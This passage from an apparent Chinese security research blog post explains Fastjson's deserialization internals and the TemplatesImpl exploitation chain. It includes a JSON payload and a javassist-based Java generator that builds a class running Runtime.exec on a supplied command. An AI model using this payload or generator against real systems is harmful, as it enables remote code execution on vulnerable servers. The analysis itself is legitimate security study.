<li><code>&#123;...&#125;</code> → <code>com.alibaba.fastjson.JSONObject</code></li>
<li><code>[...]</code> → <code>com.alibaba.fastjson.JSONArray</code></li>
</ul>
</li>
<li><p>另外一些基础类型也可以直接转换：</p>
<ul>
<li>字符串字面量 → <code>java.lang.String</code>（例如 <code>&quot;\&quot;hello\&quot;&quot;</code> → <code>&quot;hello&quot;</code>）</li>
<li>布尔字面量 → <code>java.lang.Boolean</code>（例如 <code>&quot;true&quot;</code> → <code>true</code>）</li>
<li>数值字面量 → <code>java.lang.Integer</code> &#x2F; <code>java.lang.Long</code> &#x2F; <code>java.math.BigDecimal</code> 等（按大小&#x2F;小数位自适应，可配 <code>Feature.UseBigDecimal</code>）</li>
<li><code>null</code> → <code>null</code></li>
</ul>
</li>
</ul>
<h4 id="反序列化行为"><a href="#反序列化行为" class="headerlink" title="反序列化行为"></a>反序列化行为</h4><p>与序列化类似，反序列化同样有一个描述行为的枚举 <code>Feature</code>。通常默认情况下为 <code>DEFAULT_PARSER_FEATURE</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 静态初始化代码块，在类加载时执行一次</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">features</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 开启反序列化时的一些默认特性（用位运算叠加掩码）</span></span><br><span class="line">    features |= Feature.AutoCloseSource.getMask();        <span class="comment">// 自动关闭输入源（Reader/InputStream）</span></span><br><span class="line">    features |= Feature.InternFieldNames.getMask();       <span class="comment">// 对字段名调用 String.intern()，减少重复字符串内存占用</span></span><br><span class="line">    features |= Feature.UseBigDecimal.getMask();          <span class="comment">// 将小数统一解析为 BigDecimal，避免精度丢失</span></span><br><span class="line">    features |= Feature.AllowUnQuotedFieldNames.getMask();<span class="comment">// 允许未加引号的字段名（宽松模式）</span></span><br><span class="line">    features |= Feature.AllowSingleQuotes.getMask();      <span class="comment">// 允许字符串使用单引号（宽松模式）</span></span><br><span class="line">    features |= Feature.AllowArbitraryCommas.getMask();   <span class="comment">// 允许多余的逗号（宽松模式）</span></span><br><span class="line">    features |= Feature.SortFeidFastMatch.getMask();      <span class="comment">// 假定字段顺序一致，加速字段匹配</span></span><br><span class="line">    features |= Feature.IgnoreNotMatch.getMask();         <span class="comment">// 忽略 JSON 中多余字段，不抛异常</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值给默认的反序列化特性组合</span></span><br><span class="line">    DEFAULT_PARSER_FEATURE = features;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存反序列化时的默认特性</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> DEFAULT_PARSER_FEATURE;</span><br></pre></td></tr></table></figure></div>

<p>另外在安全研究中，<code>Feature</code> 有一个很重要的特性 <code>SupportNonPublicField</code>。默认情况下，Fastjson 在反序列化时只会给 <strong>public 字段</strong> 或通过 <strong>setter 方法</strong> 赋值。</p>
<p>当启用 <code>SupportNonPublicField</code> 后，Fastjson 会通过反射直接写入 <strong>private &#x2F; protected 字段</strong>，即便没有对应的 setter。</p>
<h4 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h4><p><strong>0) 入口与初始化</strong></p>
<ol>
<li><code>JSON.parse(text)</code> → 创建 <code>DefaultJSONParser(text, ParserConfig.global, features)</code>。</li>
<li>构造 <code>JSONLexer</code>（<code>JSONScanner</code>&#x2F;<code>JSONReaderScanner</code>），按 <code>Feature</code> 配置宽松语法、数值策略等（如 <code>AllowSingleQuotes</code>、<code>UseBigDecimal</code>、<code>IgnoreNotMatch</code>…）。</li>
<li>调用 <code>DefaultJSONParser.parse()</code> 进入主解析。</li>
</ol>
<hr>
<p><strong>1) 顶层 token 分派</strong></p>
<ul>
<li><code>null</code> → 返回 <code>null</code></li>
<li><code>true/false</code> → <code>Boolean</code></li>
<li><strong>整数</strong> → 依据大小：<code>Integer</code> &#x2F; <code>Long</code> &#x2F;（溢出）<code>BigInteger</code></li>
<li><strong>小数</strong> → <code>Double</code>，若启用 <code>UseBigDecimal</code> 则 <code>BigDecimal</code></li>
<li><strong>字符串</strong> → <code>String</code>；若启用 <code>AllowISO8601DateFormat</code> 且命中 ISO‑8601，顶层可直接返 <code>Date</code></li>
<li><strong>“{” 对象</strong> → <strong>对象分支</strong>（见 §2）</li>
<li><strong>“[” 数组</strong> → <strong>数组分支</strong>（见 §3）</li>
</ul>
<hr>
<p><strong>2) 对象分支（“{}”）</strong>：<strong>有两条路径</strong></p>
<p><strong>2.1 特殊键与类型识别（极早期处理）</strong></p>
<ul>
<li>读取第一个字段名；若为 <strong><code>@type</code>（或自定义 typeKey）</strong> 且<strong>未禁用特殊键检测</strong>：<ul>
<li>调 <code>ParserConfig.checkAutoType(...)</code> 审核白&#x2F;黑名单 &#x2F; <code>safeMode</code>；</li>
<li><strong>放行</strong>：得到目标 <code>Class</code> → <code>ParserConfig.getDeserializer(type)</code> → <strong>进入强类型反序列化</strong>（§2.2）。</li>
<li><strong>不放行</strong>：把 <code>@type</code> 当作普通字段处理（落到 §2.3）。</li>
</ul>
</li>
<li>若第一个键为 <code>&quot;$ref&quot;</code>：按 JSONPath 引用规则回填对象（<code>$</code> 根、<code>@</code> 父、<code>..</code> 向上等）</li>
</ul>
<blockquote>
<p>备注：<code>@type</code> 一般只在<strong>对象首个字段</strong>时被识别为“类型标识”。</p>
</blockquote>
<p><strong>2.2 强类型反序列化（AutoType 放行时）</strong></p>
<ul>
<li>取得 <code>ObjectDeserializer</code>（<code>JavaBean</code>→<code>JavaBeanDeserializer</code>，<code>Map</code>&#x2F;<code>Collection</code>&#x2F;数组&#x2F;枚举等有各自实现）。</li>
<li><code>deserialze(parser, type, fieldName)</code> 期间：<ul>
<li><strong>实例化</strong>：调用无参构造&#x2F;工厂路径。</li>
<li><strong>属性赋值策略</strong>：<ol>
<li><strong>有 <code>setter</code></strong> → 优先调用 <code>setXxx(...)</code>；</li>
<li><strong>无 <code>setter</code> 且 <code>getter</code> 返回可变容器（<code>Map</code>&#x2F;<code>Collection</code>&#x2F;<code>Atomic*</code>）</strong> → 调 <code>getter</code> 取<strong>现有实例</strong>并<strong>就地填充</strong>；</li>
<li><strong>启用 <code>SupportNonPublicField</code></strong> → 直接反射写字段（对象&#x2F;数组会先构建声明类型实例再整体替换）。</li>
</ol>
</li>
<li><strong>字段名匹配（smartMatch）</strong>：精确 → <code>@JSONField</code> 别名 → 布尔 <code>isXxx</code>↔<code>xxx</code> → 去下划线&#x2F;连字符的宽松匹配。</li>
<li><strong>特殊类型</strong>：<code>byte[]</code> 值按 Base64 自动解码；日期可识别 ISO‑8601。</li>
</ul>
</li>
<li><strong>返回</strong>：目标 <strong>JavaBean&#x2F;Map&#x2F;Collection&#x2F;数组&#x2F;枚举</strong> 实例。</li>
</ul>
<p><strong>2.3 非强类型（未用&#x2F;未放行 <code>@type</code>）→ Map 容器</strong></p>
<ul>
<li>创建 <code>JSONObject</code>（背后通常是 <code>LinkedHashMap</code>）。</li>
<li>逐字段：名称匹配（含 smartMatch&#x2F;别名&#x2F;布尔前缀），<strong>递归解析</strong>值并 <code>put</code> 进 Map。</li>
<li><strong>关于“对象当 key”</strong>：为了<strong>把 key 归一为字符串</strong>，会在 <code>parseObject</code> 路径上对 key 做一次 <strong><code>JSON.toJSONString</code><strong>（或 <code>toString()</code>），从而</strong>在解析阶段触发了一次“序列化”</strong>（这正是“<strong>对象当 Key</strong>”技巧能在<strong>解析期</strong>触发 getter 的原因）。</li>
<li><strong>返回</strong>：<code>JSONObject</code>。</li>
</ul>
<hr>
<p><strong>3) 数组分支（“[]”）</strong></p>
<ul>
<li>创建 <code>JSONArray</code>；逐元素递归 <code>parse()</code>。</li>
<li>元素可为字面量、<code>JSONObject</code>、<code>JSONArray</code>，或内部带 <code>@type</code> 的<strong>强类型元素</strong>（若放行则该元素返回 JavaBean 等）。</li>
<li><strong>返回</strong>：<code>JSONArray</code>。</li>
</ul>
<hr>
<p><strong>4) 结果收敛</strong></p>
<ul>
<li><strong>命中强类型（<code>@type</code> 放行）</strong> → 返回<strong>具体实例</strong>（<code>JavaBean</code>&#x2F;<code>Map</code>&#x2F;…）。</li>
<li><strong>否则</strong> → 返回 <code>JSONObject</code> &#x2F; <code>JSONArray</code> &#x2F; 基础字面量（含可能的 <code>Date</code>）。</li>
</ul>
<h3 id="parseObject"><a href="#parseObject" class="headerlink" title="parseObject"></a>parseObject</h3><p><code>parseObject</code> 有下面两种重载：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 JSON 字符串解析为 &#123;<span class="doctag">@link</span> com.alibaba.fastjson.JSONObject&#125; 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> text 待解析的 JSON 字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析得到的 &#123;<span class="doctag">@code</span> JSONObject&#125; 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> com.alibaba.fastjson.JSONException 如果 JSON 文本格式不合法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 JSON 字符串解析为指定类型的 Java 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> text  待解析的 JSON 字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz 目标类的 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;   泛型参数，对应返回对象类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析得到的 JavaBean 实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> com.alibaba.fastjson.JSONException 如果 JSON 文本格式不合法，或无法匹配目标类的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">parseObject</span><span class="params">(String text, Class&lt;T&gt; clazz)</span>;</span><br></pre></td></tr></table></figure></div>

<p>与 <code>parse</code> 不同，**<code>parseObject</code> 系列方法默认不会信任 JSON 字符串中的 <code>@type</code> 字段**：</p>
<ul>
<li>**<code>parse(String)</code>**：如果 JSON 包含 <code>@type</code>，且 AutoType 策略放行，会直接实例化为指定的类。</li>
<li>**<code>parseObject(String)</code> &#x2F; <code>parseObject(String, Class&lt;T&gt;)</code><strong>：</strong>忽略 <code>@type</code>**，结果固定为 <code>JSONObject</code>&#x2F;<code>JSONArray</code> 或者显式指定的类型。</li>
</ul>
<h4 id="反序列化过程-1"><a href="#反序列化过程-1" class="headerlink" title="反序列化过程"></a>反序列化过程</h4><p><code>parseObject(String text)</code> 本质上是对 <code>parse</code> 的一层封装：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text, Feature... features)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JSONObject) parse(text, features);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>如果结果已经是 <code>JSONObject</code>，直接返回。</p>
</li>
<li><p>如果结果不是 <code>JSONObject</code>（例如是 JavaBean、数组、原始值），则调用 <code>JSON.toJSON(obj)</code> 转换为 <code>JSONObject</code>。</p>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这就是为什么我们会观察到 <code>parseObject</code> 虽然会忽略 <code>@type</code> 字段，但是会调用到 <code>@type</code> 指定的类的 getter 和 setter 方法。</p>
<ul>
<li>setter 方法是 <code>parseObject</code> 调用 <code>parse</code> 函数按照 <code>@type</code> 字段初始化类的时候调用的。</li>
<li>getter 方法是 <code>JSON.toJSON</code> 将 <code>parse</code> 返回的对象转换为 <code>JSONObject</code> 的时候从对象获取属性时调用的。</li>
</ul>

    </div>
  </div>

<p>具体来说 <code>parseObject(String text)</code> 的反序列化过程为：</p>
<ol>
<li><p><strong>调用 <code>parse(text)</code>（通用解析入口）</strong></p>
<ul>
<li>如果 JSON 是对象&#x2F;数组&#x2F;字面量 → 返回 <code>JSONObject</code>&#x2F;<code>JSONArray</code>&#x2F;<code>String|Boolean|Number|null</code>。</li>
<li><strong>如果 JSON 含有 <code>@type</code> 且 AutoType 策略放行</strong> → <code>parse</code> 会<strong>先实例化该类</strong>并进行 <strong>JavaBean 赋值</strong>：<ul>
<li>调用<strong>无参构造器</strong>（你看到的 <code>Non-Arg Constructor</code> 打印就发生在这里）。</li>
<li><strong>按字段名匹配 setter</strong>（或 <code>Feature.SupportNonPublicField</code> 直写 <code>private</code> 字段）给属性赋值（你看到的 <code>setAge/setName</code> 就发生在这里）。</li>
<li>特殊类型（如 <code>byte[]</code>）会在此时完成 <strong>Base64 解码</strong>（<code>JSONScanner#bytesValue</code>）。</li>
<li>字段名匹配支持 <strong>smartMatch</strong>（忽略 <code>_</code> &#x2F; <code>-</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>结果是 <code>JSONObject</code> 就直接返回</strong></p>
<ul>
<li>这种情况下，没有实例化 JavaBean，不会有构造&#x2F; setter 的副作用。</li>
</ul>
</li>
<li><p><strong>若结果不是 <code>JSONObject</code> → 调用 <code>JSON.toJSON(obj)</code> 做转换</strong></p>
<ul>
<li><p><strong>如果 <code>obj</code> 是 JavaBean（步骤1已实例化）</strong>：这是一个“<strong>序列化侧</strong>”的转换过程：<code>toJSON</code> 会用 <strong>JavaBean 的 getter&#x2F;isXxx 或直接读字段</strong> 取值，组装成一个新的 <code>JSONObject</code>。</p>
</li>
<li><p>如果 <code>obj</code> 是 <code>JSONArray</code> 或字面量通常会直接报错，例如：</p>
<blockquote>
<p>com.alibaba.fastjson.JSONArray cannot be cast to com.alibaba.fastjson.JSONObject</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<hr>
<p><code>parseObject(String text, Class&lt;T&gt; clazz)</code> 则是直接使用传入的 <code>clazz</code> 来实例化目标对象，并且同样会忽略 JSON 中的 <code>@type</code> 字段。</p>
<p><code>parseObject(String text, Class&lt;T&gt; clazz)</code> 与前面的 <code>parseObject(String text)</code> 过程不太一样，不过在反序列化过程中可以调用 <code>clazz</code> 指定目标类的 getter 方法：</p>
<ol>
<li>**忽略 <code>@type</code>**，严格按 <code>clazz</code> 进行反序列化。</li>
<li><strong>实例化</strong>：通过无参构造器 <code>new clazz()</code>。</li>
<li><strong>赋值</strong>：和前面是属性赋值策略一致。</li>
<li><strong>返回</strong>：强类型的 <code>T</code> 实例。<code>@type</code> 被忽略。</li>
</ol>
<h1 id="FastJson-利用链"><a href="#FastJson-利用链" class="headerlink" title="FastJson 利用链"></a>FastJson 利用链</h1><ul>
<li><p><strong>TemplatesImpl 家族</strong>（私有字段直写注入字节码，免出网）</p>
</li>
<li><p><strong>JNDI 家族</strong>（各种“把字符串当 JNDI 名字去查”的类，通常需要出网）</p>
</li>
<li><p><strong>BCEL 家族</strong>（<code>BasicDataSource/UnpooledDataSource/...</code> + <code>$$BCEL$$</code>，免出网但受 JDK&#x2F;版本限制）</p>
</li>
<li><p><strong>AutoCloseable &#x2F; 流式 I&#x2F;O 家族</strong>（不依赖外连：本地文件清空&#x2F;写入&#x2F;拼装压缩流等副作用）</p>
</li>
</ul>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><blockquote>
<p>Fastjson <strong>≤ 1.2.24</strong> 时 AutoType 默认开；<strong>并且要启用</strong> <code>Feature.SupportNonPublicField</code> 才能<strong>直写私有字段</strong>。<code>SupportNonPublicField</code> 自 <strong>1.2.22</strong> 起提供。</p>
</blockquote>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 有加载任意字节码的利用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">  └─→ newTransformer()</span><br><span class="line">       └─→ getTransletInstance()</span><br><span class="line">            ├─[前置条件] _name != null，否则直接返回</span><br><span class="line">            ├─ 若 _class == null → defineTransletClasses()</span><br><span class="line">            │     ├─ 构造 TransletClassLoader（doPrivileged）</span><br><span class="line">            │     ├─ 遍历 _bytecodes：</span><br><span class="line">            │     │     └─ loader.defineClass(byte[])  // 包可见便捷方法，内部调父类 protected defineClass(...)</span><br><span class="line">            │     ├─ 以父类是否为 AbstractTranslet 识别“主类”，记录 _transletIndex</span><br><span class="line">            │     └─ 异常处理（ClassFormatError/LinkageError → 包装为 TransformerConfigurationException）</span><br><span class="line">            ├─ translet = (AbstractTranslet) _class[_transletIndex].newInstance()</span><br><span class="line">            │     // 此时触发：类初始化(&lt;clinit&gt;) → 构造器(&lt;init&gt;) 的顺序</span><br><span class="line">            ├─ translet.postInitialization()/setTemplates(...) 等收尾</span><br><span class="line">            └─ 返回 translet</span><br><span class="line">       └─ 用 translet 构造 TransformerImpl</span><br><span class="line">  └─ TransformerImpl.getOutputProperties()</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以构造如下 payload：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;evilCode after Base64&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HelloTemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>其中各字段含义如下：</p>
<ul>
<li><p><code>@type</code> → 目标类 <code>TemplatesImpl</code>，也就是我们需要构造并调用函数触发任意类加载的类。</p>
<blockquote>
<p><strong>AutoType 必须可用</strong>（≤ 1.2.24 默认开启；≥ 1.2.25 默认关闭并有黑&#x2F;白名单检查，需要“开启&#x2F;白名单&#x2F;绕过”）。这是 fastjson 的通用门槛，和 <code>TemplatesImpl</code> 本身无关。</p>
</blockquote>
</li>
<li><p><code>_bytecodes: byte[][]</code> → <strong>Base64 字符串数组</strong>，Fastjson 会自动把每个字符串解成 <code>byte[]</code>，后续作为恶意类字节码加载。</p>
<blockquote>
<p>字节码对应的恶意类要求至少包含一个<strong>主类</strong>，它的父类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>。<code>defineTransletClasses()</code> 会逐个 <code>defineClass</code>，并通过“父类是否为 <code>AbstractTranslet</code>”来认定主类并记录 <code>_transletIndex</code>。</p>
<p>在 <code>getTransletInstance()</code> → <code>defineTransletClasses()</code> → <code>TransletClassLoader.defineClass(byte[])</code> 处被加载；随后 <code>newInstance()</code> → 执行 <code>&lt;clinit&gt;</code> 与构造器。</p>
</blockquote>
</li>
<li><p><code>_name: String</code> → 非空“标识名”；必须有，后面 <code>defineTransletClasses()</code> 要用。</p>
<blockquote>
<p><strong>必须非空</strong>，否则 <code>getTransletInstance()</code> 直接 <code>return null</code>，链路停止。填任意非空字符串即可（也用于异常信息中的名字）。</p>
</blockquote>
</li>
<li><p><code>_tfactory: TransformerFactoryImpl</code> → <code>&#123;&#125;</code> 表示“构造一个默认实例”，这样会调用 <code>TransformerFactoryImpl</code> 的无参构造函数实例化一个 <code>TransformerFactoryImpl</code> 对象填在该属性上。</p>
<blockquote>
<p>在高版本 GDK 中，<code>defineTransletClasses()</code> 里要用它提供 <code>ExternalExtensionsMap</code> 来构造 <code>TransletClassLoader</code>；**不能为 <code>null</code>**。</p>
</blockquote>
</li>
<li><p><code>outputProperties: Properties</code> →这是 <strong>getter 对应的“属性名”</strong>。<code>TemplatesImpl#getOutputProperties()</code> 返回 <code>Properties</code>（容器类型），满足 fastjson 的“<strong>getter‑only 容器就地填充</strong>”条件；所以给它一个 <code>&#123;&#125;</code>，fastjson 会<strong>调用 <code>getOutputProperties()</code></strong> 取得实例然后往里填，这一步就把整条<strong>类加载链</strong>触发了。</p>
</li>
</ul>
<p>我们可以通过下面这段代码生成 payload：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BuildFastjsonTemplatesPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPayload</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 生成恶意类字节码（必须继承 AbstractTranslet）</span></span><br><span class="line">        <span class="type">byte</span>[] evilBytes = makeEvilTranslet(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) Base64 编码（Fastjson 的 _bytecodes 接受 base64 字符串数组）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilBytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 拼接为你需求的 JSON 结构</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_bytecodes\&quot;: [\&quot;&quot;</span> + b64 + <span class="string">&quot;\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_name\&quot;: \&quot;HelloTemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成一个继承 AbstractTranslet 的类：</span></span><br><span class="line"><span class="comment">     * - 类名任意（如 EvilClass）</span></span><br><span class="line"><span class="comment">     * - 构造器中直接 Runtime.exec(cmd)</span></span><br><span class="line"><span class="comment">     * - 需设置父类为 AbstractTranslet，否则不会被作为“主类”实例化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] makeEvilTranslet(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 父类必须：AbstractTranslet</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ct.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 无参构造器：实例化即执行</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ct);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + escape(cmd) + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line">        ct.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// class 版本（降低兼容性风险）</span></span><br><span class="line">        ct.getClassFile().setMajorVersion(<span class="number">49</span>); <span class="comment">// Java 5</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回字节码</span></span><br><span class="line">        <span class="keyword">return</span> ct.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 简单转义双引号与反斜杠，防止命令串破坏 Java/JSON 字面量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">escape</span><span class="params">(String s)</span> 